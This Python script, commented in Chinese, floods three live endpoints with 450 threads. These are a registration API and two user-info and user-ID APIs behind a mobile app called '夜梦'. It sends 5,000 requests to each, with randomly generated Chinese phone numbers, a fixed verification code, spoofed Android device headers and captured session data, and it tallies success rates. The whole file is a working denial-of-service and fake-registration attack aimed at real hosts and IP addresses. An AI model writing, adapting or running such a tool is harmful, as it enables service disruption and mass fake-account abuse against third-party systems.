import requests
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import time
import random

# 用于统计每个URL的请求结果
stats = defaultdict(lambda: {"total": 0, "success": 0, "failed": 0})
stats_lock = threading.Lock()

# 中国手机号码号段列表
CHINA_MOBILE_PREFIXES = [
    "134", "135", "136", "137", "138", "139",
    "147", "148",
    "150", "151", "152", "157", "158", "159",
    "172", "178", "182", "183", "184", "187", "188",
    "195", "197", "198"
]

CHINA_UNICOM_PREFIXES = [
    "130", "131", "132",
    "145", "146",
    "155", "156",
    "166", "167",
    "175", "176",
    "185", "186",
    "196"
]

CHINA_TELECOM_PREFIXES = [
    "133", "149",
    "153",
    "173", "177",
    "180", "181", "189", "199",
    "190", "191", "193"
]

def generate_china_phone_number():
    """
    生成一个随机的中国手机号码
    """
    all_prefixes = CHINA_MOBILE_PREFIXES + CHINA_UNICOM_PREFIXES + CHINA_TELECOM_PREFIXES
    prefix = random.choice(all_prefixes)
    # 生成8位随机数字
    suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    return prefix + suffix

def send_registration_request(request_id=0, phone_number=None):
    """
    发送第一个POST请求: 用户注册
    POST /api/register HTTP/1.1
    """
    url = "http://120.24.76.130:16919/api/register"

    headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "120.24.76.130:16919",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": "okhttp/4.10.0"
    }

    # 如果没有提供手机号，则生成一个随机手机号
    if phone_number is None:
        phone_number = generate_china_phone_number()

    payload = {
        "phone": phone_number,
        "code": "916764",
        "sjc": int(time.time() * 1000),  # 使用当前时间戳
        "ttttt": "bda6e96a2a5932f45b48d5b6186a5482",
        "data": "HUAWEI-JKM-AL00b"
    }

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        with stats_lock:
            stats[url]["total"] += 1
            if 200 <= response.status_code < 300:
                stats[url]["success"] += 1
            else:
                stats[url]["failed"] += 1

        print(f"[注册请求 #{request_id}] URL: {url}, 手机号: {phone_number}, 状态码: {response.status_code}")
        return True
    except Exception as e:
        with stats_lock:
            stats[url]["total"] += 1
            stats[url]["failed"] += 1
        print(f"[注册请求 #{request_id}] URL: {url}, 手机号: {phone_number}, 错误: {e}")
        return False

def send_user_index_request(request_id=0, token=""):
    """
    发送第二个POST请求: 获取用户信息
    POST /user/index HTTP/1.1
    """
    url = "http://api1.axing0905.fit/user/index"

    headers = {
        "Token": token,
        "user-agent": "Mozilla/5.0 (Linux; Android 9; JKM-AL00b Build/HUAWEIJKM-AL00b; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.333334)",
        "Content-Type": "application/json",
        "Host": "api1.axing0905.fit",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br"
    }

    payload = {
        "deviceId": "5CEB381E086205D3044D7193187B9B5A",
        "info": "{\"SDKVersion\":\"\",\"appId\":\"__UNI__25967AC\",\"appLanguage\":\"zh-Hans\",\"appName\":\"夜梦\",\"appVersion\":\"1.0.4\",\"appVersionCode\":103,\"appWgtVersion\":\"1.0.4\",\"brand\":\"huawei\",\"browserName\":\"chrome\",\"browserVersion\":\"88.0.4324.93\",\"deviceBrand\":\"huawei\",\"deviceId\":\"5CEB381E086205D3044D7193187B9B5A\",\"deviceModel\":\"JKM-AL00b\",\"deviceOrientation\":\"portrait\",\"devicePixelRatio\":3,\"deviceType\":\"phone\",\"errMsg\":\"getSystemInfoSync:ok\",\"isUniAppX\":false,\"language\":\"zh-CN\",\"model\":\"JKM-AL00b\",\"oaid\":\"c3fb7fdd-fffd-b73a-bcce-5effd3ad907d\",\"osAndroidAPILevel\":28,\"osLanguage\":\"zh-CN\",\"osName\":\"android\",\"osTheme\":\"light\",\"osVersion\":\"9\",\"pixelRatio\":3,\"platform\":\"android\",\"romName\":\"HarmonyOS\",\"romVersion\":\"2.0.0\",\"safeArea\":{\"left\":0,\"right\":360,\"top\":28,\"bottom\":741,\"width\":360,\"height\":713},\"safeAreaInsets\":{\"top\":28,\"right\":0,\"bottom\":0,\"left\":0},\"screenHeight\":741,\"screenWidth\":360,\"statusBarHeight\":28,\"system\":\"Android 9\",\"ua\":\"Mozilla/5.0 (Linux; Android 9; JKM-AL00b Build/HUAWEIJKM-AL00b; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 uni-app (Immersed/28.333334)\",\"uniCompileVersion\":\"4.65\",\"uniCompilerVersion\":\"4.65\",\"uniPlatform\":\"app\",\"uniRuntimeVersion\":\"4.65\",\"version\":\"1.9.9.82412\",\"windowBottom\":0,\"windowHeight\":741,\"windowTop\":0,\"windowWidth\":360}",
        "osname": "Android 9",
        "mobile": "15236589652",
        "lng": 116.25037,
        "lat": 36.84886,
        "code": "575458"
    }

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        with stats_lock:
            stats[url]["total"] += 1
            if 200 <= response.status_code < 300:
                stats[url]["success"] += 1
            else:
                stats[url]["failed"] += 1

        print(f"[用户索引请求 #{request_id}] URL: {url}, 状态码: {response.status_code}")
        return True
    except Exception as e:
        with stats_lock:
            stats[url]["total"] += 1
            stats[url]["failed"] += 1
        print(f"[用户索引请求 #{request_id}] URL: {url}, 错误: {e}")
        return False

def send_get_userid_request(request_id=0):
    """
    发送第三个POST请求: 获取用户ID
    POST /api/uploads/getuserid HTTP/1.1
    """
    url = "http://38.91.114.43:1010/api/uploads/getuserid"

    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 9; JKM-AL00b Build/HUAWEIJKM-AL00b; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/28.333334)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "38.91.114.43:1010",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br"
    }

    # 注意这个请求使用的是表单数据而不是JSON
    payload = {
        "mobile": "11111111111_EKLK"
    }

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)
        with stats_lock:
            stats[url]["total"] += 1
            if 200 <= response.status_code < 300:
                stats[url]["success"] += 1
            else:
                stats[url]["failed"] += 1

        print(f"[获取用户ID请求 #{request_id}] URL: {url}, 状态码: {response.status_code}")
        return True
    except Exception as e:
        with stats_lock:
            stats[url]["total"] += 1
            stats[url]["failed"] += 1
        print(f"[获取用户ID请求 #{request_id}] URL: {url}, 错误: {e}")
        return False

def print_statistics():
    """
    打印统计信息
    """
    print("\n" + "=" * 60)
    print("请求统计结果")
    print("=" * 60)

    for url, stat in stats.items():
        print(f"URL: {url}")
        print(f"  总请求次数: {stat['total']}")
        print(f"  成功次数: {stat['success']}")
        print(f"  失败次数: {stat['failed']}")
        if stat['total'] > 0:
            success_rate = stat['success'] / stat['total'] * 100
            print(f"  成功率: {success_rate:.2f}%")
        print("-" * 60)

if __name__ == "__main__":
    # 设置每个URL的请求次数
    requests_per_url = 5000  # 每个URL发送5次请求

    # 生成一批手机号用于注册请求
    phone_numbers = [generate_china_phone_number() for _ in range(requests_per_url)]

    # 创建线程池
    with ThreadPoolExecutor(max_workers=450) as executor:
        # 提交任务到线程池
        futures = []

        # 提交注册请求任务，使用生成的手机号
        for i in range(requests_per_url):
            futures.append(executor.submit(send_registration_request, i+1, phone_numbers[i]))

        # 提交用户索引请求任务
        for i in range(requests_per_url):
            futures.append(executor.submit(send_user_index_request, i+1))

        # 提交获取用户ID请求任务
        for i in range(requests_per_url):
            futures.append(executor.submit(send_get_userid_request, i+1))

        # 等待所有任务完成
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"任务执行出错: {e}")

    # 打印统计结果
    print_statistics()
